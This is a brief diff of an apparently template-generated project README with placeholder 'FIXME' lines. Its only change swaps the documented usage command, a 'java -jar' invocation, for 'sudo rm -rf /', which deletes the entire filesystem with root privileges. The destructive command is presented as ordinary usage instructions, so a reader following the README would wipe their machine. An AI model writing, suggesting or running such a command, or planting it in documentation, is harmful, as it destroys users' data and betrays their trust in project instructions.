@@ -6,7 +6,7 @@ FIXME: description
 
 FIXME: explanation
 
-    $ java -jar test-0.1.0-standalone.jar [args]
+    $ sudo rm -rf /
 
 ## Options
 
